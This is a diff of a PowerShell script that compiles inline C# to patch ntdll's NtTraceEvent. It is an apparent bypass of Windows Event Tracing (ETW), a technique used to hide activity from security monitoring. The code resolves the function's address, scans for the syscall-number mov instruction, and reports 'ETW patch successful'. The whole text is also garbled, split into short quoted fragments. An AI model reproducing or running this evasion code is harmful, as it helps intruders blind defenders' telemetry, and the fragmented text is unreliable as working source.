@@ -3,17 +3,21 @@ using Sy','stem;
 usin','g System.Ru','ntime.Inter','opServices;','
 
 namespa','ce Test
-{','
+{
+','
     public',' class Prog','ram
-    {','
+    {
+','
         [U','nmanagedFun','ctionPointe','r(CallingCo','nvention.St','dCall)]
-  ','      publi','c delegate ','bool Virtua','lProtect(In','tPtr lpAddr','ess, UIntPt','r dwSize, u','int flNewPr','otect, out ','uint lpflOl','dProtect);','
+  ','      publi','c delegate ','bool Virtua','lProtect(In','tPtr lpAddr','ess, UIntPt','r dwSize, u','int flNewPr','otect, out ','uint lpflOl','dProtect);
+','
 
         ','[DllImport(','"kernel32.d','ll", CharSe','t = CharSet','.Ansi, Exac','tSpelling =',' true, SetL','astError = ','true)]
    ','     public',' static ext','ern IntPtr ','GetProcAddr','ess(IntPtr ','hModule, st','ring procNa','me);
 
    ','     [DllIm','port("kerne','l32.dll", C','harSet = Ch','arSet.Auto)',']
-        ','public stat','ic extern I','ntPtr GetMo','duleHandle(','string lpMo','duleName);','
+        ','public stat','ic extern I','ntPtr GetMo','duleHandle(','string lpMo','duleName);
+','
 
         ','private con','st byte x64','_RET_INSTRU','CTION_OPCOD','E = 0xC3;  ','      // ''r','et'' - instr','uction opco','de
        ',' private co','nst byte x6','4_MOV_INSTR','UCTION_OPCO','DE = 0xB8; ','       // ''','mov'' - inst','ruction opc','ode
@@ -26,9 +30,11 @@ namespa','ce Test
 
  ','           ','// Get the ','address of ','"NtTraceEve','nt"
       ','      IntPt','r hNtdll = ','GetModuleHa','ndle("NTDLL','");
-      ','      if (h','Ntdll == In','tPtr.Zero)','
+      ','      if (h','Ntdll == In','tPtr.Zero)
+','
           ','      retur','n false;
-','
+
+','
           ','  pNtTraceE','vent = GetP','rocAddress(','hNtdll, "Nt','TraceEvent"',');
        ','     if (pN','tTraceEvent',' == IntPtr.','Zero)
     ','           ',' return fal','se;
@@ -45,7 +51,8 @@ namespa','ce Test
          ','   {
      ','           ','if (functio','nBytes[i] =','= x64_MOV_I','NSTRUCTION_','OPCODE)
   ','           ','   {
-     ','           ','    // Set ','the pointer',' to NtTrace','Event''s SSN',' and break','
+     ','           ','    // Set ','the pointer',' to NtTrace','Event''s SSN',' and break
+','
           ','          s','snAddress =',' new IntPtr','(pNtTraceEv','ent.ToInt64','() + i + 1)',';
         ','           ',' found = tr','ue;
       ','           ','   break;
@@ -56,7 +63,8 @@ namespa','ce Test
       ','           ','   function','Bytes[i] ==',' 0x0F ||
  ','           ','        fun','ctionBytes[','i] == 0x05)','
          ','       {
- ','           ','        ret','urn false;','
+ ','           ','        ret','urn false;
+','
           ','      }
   ','          }','
 
@@ -86,8 +94,10 @@ namespa','ce Test
    ','         //','Console.Wri','teLine("[+]',' Successful','ly unhooked',' ETW at 0x{','0}!", pNtTr','aceEvent.To','String("X")',');
        ','     //Cons','ole.WriteLi','ne("[+] Suc','cessfully b','ypassed ETW',' on Windows','.");
 
-   ','         re','turn true;','
-        }','
+   ','         re','turn true;
+','
+        }
+','
     }
 }
 ','"@
@@ -95,7 +105,8 @@ namespa','ce Test
 try {','
     Add-T','ype -TypeDe','finition $C','ode -Refere','ncedAssembl','ies "System','.Runtime.In','teropServic','es"
     $r','esult = [Te','st.Program]','::PatchETW(',')
-    if (','$result) {','
+    if (','$result) {
+','
         Wr','ite-Host "E','TW patch su','ccessful!" ','-Foreground','Color Green','
     } els','e {
       ','  Write-Hos','t "ETW patc','h failed." ','-Foreground','Color Red
